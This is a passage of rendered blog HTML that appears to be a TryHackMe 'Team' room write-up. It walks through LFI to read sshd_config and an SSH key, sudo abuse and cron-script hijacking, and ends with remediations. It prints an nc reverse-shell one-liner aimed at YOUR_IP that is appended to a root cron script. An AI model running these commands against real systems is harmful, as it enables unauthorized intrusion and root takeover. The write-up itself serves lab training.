+          src="http://localhost:1313/posts/team-tryhackme/dev-subdomain_hu_569ad5ee49d7d8be.png" srcset="http://localhost:1313/posts/team-tryhackme/dev-subdomain_hu_3ee71dbfa402c8c7.png 330w,http://localhost:1313/posts/team-tryhackme/dev-subdomain_hu_569ad5ee49d7d8be.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/dev-subdomain.png 764w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/dev-subdomain.png 764w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The subdomain hosted a PHP application with a <code>page</code> parameter.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/dev-page_hu_efbf99d9fbee7e68.webp 330w,http://localhost:1313/posts/team-tryhackme/dev-page_hu_45d7833a743ae5c7.webp 660w
+            
+              ,http://localhost:1313/posts/team-tryhackme/dev-page_hu_70431c06cf6dde38.webp 1024w
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/dev-page_hu_619a6807dc8239f1.webp 1044w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1044"
+        height="77"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/dev-page_hu_c3c4796f8241dd44.png" srcset="http://localhost:1313/posts/team-tryhackme/dev-page_hu_c6603e5ee9fb43b6.png 330w,http://localhost:1313/posts/team-tryhackme/dev-page_hu_c3c4796f8241dd44.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/dev-page_hu_61c2ba47727cf9e4.png 1024w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/dev-page.png 1044w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Testing the parameter for path traversal by requesting a known valid file.</p>
+<pre tabindex="0"><code>http://dev.team.thm/script.php?page=teamshare.php
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_e4b8ac2a4ecc4285.webp 330w,http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_13f56141754ad1ed.webp 660w
+            
+              ,http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_3cd51d3b0219e7d3.webp 1024w
+            
+            
+              ,http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_91f42aa8d50cee05.webp 1320w
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="1908"
+        height="296"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_6ad3bf3ade8420e.png" srcset="http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_f8880666623521fe.png 330w,http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_6ad3bf3ade8420e.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_574b494db85f8a8.png 1024w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/path-traversal-test_hu_cb4296440bd385d9.png 1320w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The parameter was confirmed vulnerable to local file inclusion (LFI).</p>
+<h2 id="step-2-initial-access" class="relative group">Step 2: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-initial-access" aria-label="Anchor">#</a></span></h2><p>The LFI vulnerability was used to read sensitive system files. The SSH daemon configuration was retrieved to find the location of private keys.</p>
+<pre tabindex="0"><code>http://dev.team.thm/script.php?page=/etc/ssh/sshd_config
+</code></pre><p>The configuration revealed an <code>id_rsa</code> key belonging to <code>dale</code>. The key was extracted and used for SSH access.</p>
+<pre tabindex="0"><code>chmod 600 id_rsa
+ssh -i id_rsa dale@team.thm
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/team-tryhackme/ssh-as-dale_hu_c3d64a02e2f6d53c.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="655"
+        height="125"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/ssh-as-dale.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-3-lateral-movement--dale-to-gyles" class="relative group">Step 3: Lateral Movement — dale to gyles <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-lateral-movement--dale-to-gyles" aria-label="Anchor">#</a></span></h2><p>Once connected as <code>dale</code>, sudo privileges were checked.</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/sudo-l_hu_cad5f3dc8480bda7.webp 330w,http://localhost:1313/posts/team-tryhackme/sudo-l_hu_ff7366acaae5a8eb.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/sudo-l_hu_99e97a57e0fa0770.webp 950w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/sudo-l_hu_99e97a57e0fa0770.webp 950w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="950"
+        height="130"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/sudo-l_hu_8e77f994b351d65f.png" srcset="http://localhost:1313/posts/team-tryhackme/sudo-l_hu_7895718d951d6296.png 330w,http://localhost:1313/posts/team-tryhackme/sudo-l_hu_8e77f994b351d65f.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/sudo-l.png 950w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/sudo-l.png 950w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>User <code>dale</code> can run <code>/home/gyles/admin_checks</code> as <code>gyles</code> without a password.</p>
+<pre tabindex="0"><code>sudo -u gyles /home/gyles/admin_checks
+</code></pre><p>The script was examined for injection points.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/team-tryhackme/admin-checks-script_hu_5d76f9d7e584cfd1.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="641"
+        height="285"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/admin-checks-script.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>By injecting a reverse shell into the script execution, a shell as <code>gyles</code> was obtained.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/shell-as-gyles_hu_afeaa4136f212ee.webp 330w,http://localhost:1313/posts/team-tryhackme/shell-as-gyles_hu_af641a0edea13437.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/shell-as-gyles_hu_6316eba4802cb175.webp 879w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/shell-as-gyles_hu_6316eba4802cb175.webp 879w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="879"
+        height="207"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/shell-as-gyles_hu_63656c8e88519414.png" srcset="http://localhost:1313/posts/team-tryhackme/shell-as-gyles_hu_368c4ae6e7182aad.png 330w,http://localhost:1313/posts/team-tryhackme/shell-as-gyles_hu_63656c8e88519414.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/shell-as-gyles.png 879w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/shell-as-gyles.png 879w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-4-privilege-escalation--gyles-to-root" class="relative group">Step 4: Privilege Escalation — gyles to root <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-privilege-escalation--gyles-to-root" aria-label="Anchor">#</a></span></h2><p>Checking <code>gyles</code>&rsquo;s <code>.bash_history</code> revealed a cron job executing a backup script as root.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/team-tryhackme/bash-history-cron_hu_9f64f98d54972d3c.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="572"
+        height="301"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/bash-history-cron.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Since <code>gyles</code> was a member of the <code>admin</code> group, the backup script was writable.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/admin-group-write_hu_7e53795c222d8926.webp 330w,http://localhost:1313/posts/team-tryhackme/admin-group-write_hu_7b8e36bd0b373127.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/admin-group-write_hu_e5c4b8b17e7f848f.webp 692w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/admin-group-write_hu_e5c4b8b17e7f848f.webp 692w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="692"
+        height="90"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/admin-group-write_hu_e444749cfee3f714.png" srcset="http://localhost:1313/posts/team-tryhackme/admin-group-write_hu_47dcc1c6934c412a.png 330w,http://localhost:1313/posts/team-tryhackme/admin-group-write_hu_e444749cfee3f714.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/admin-group-write.png 692w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/admin-group-write.png 692w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>A reverse shell payload was appended to the backup script.</p>
+<pre tabindex="0"><code>echo &#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc YOUR_IP 4444 &gt;/tmp/f&#34; &gt;&gt; /path/to/backup/script
+</code></pre><p>A listener was set up and the cron job executed shortly after, granting a root shell.</p>
+<pre tabindex="0"><code>nc -lnvp 4444
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/team-tryhackme/root-shell_hu_1e11a9c689c4726e.webp 330w,http://localhost:1313/posts/team-tryhackme/root-shell_hu_5dc3420b4a873cc0.webp 660w
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/root-shell_hu_189af737c1a4ff8d.webp 740w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/team-tryhackme/root-shell_hu_189af737c1a4ff8d.webp 740w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="740"
+        height="100"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/team-tryhackme/root-shell_hu_6cf43334aa0d470a.png" srcset="http://localhost:1313/posts/team-tryhackme/root-shell_hu_855cb3f420f6ee88.png 330w,http://localhost:1313/posts/team-tryhackme/root-shell_hu_6cf43334aa0d470a.png 660w
+          
+            ,http://localhost:1313/posts/team-tryhackme/root-shell.png 740w
+          
+          
+            ,http://localhost:1313/posts/team-tryhackme/root-shell.png 740w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>This beginner-friendly box demonstrated a clean attack chain spanning multiple common misconfigurations:</p>
+<ol>
+<li><strong>Exposed backup files</strong> in a web directory leaked FTP credentials.</li>
+<li><strong>FTP enumeration</strong> revealed a subdomain and additional usernames.</li>
+<li><strong>Local file inclusion</strong> allowed reading arbitrary files, leaking SSH private keys.</li>
+<li><strong>Sudo misconfiguration</strong> on a custom script enabled lateral movement.</li>
+<li><strong>Writable cron script</strong> via group membership escalated to root.</li>
+</ol>
+<h3 id="remediations" class="relative group">Remediations <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#remediations" aria-label="Anchor">#</a></span></h3><ul>
+<li>Remove backup files (<code>.old</code>) from publicly accessible web directories.</li>
+<li>Avoid storing plaintext credentials on FTP servers.</li>
+<li>Validate and sanitize user input in file inclusion parameters.</li>
+<li>Regularly audit sudo permissions and group memberships.</li>
+<li>Restrict write permissions on cron job scripts to prevent unauthorized modification.</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="http://localhost:1313/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="http://localhost:1313/posts/cyborg-tryhackme/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Cyborg — TryHackMe</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-06-30 15:00:00 &#43;0300 EAT">30 June 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
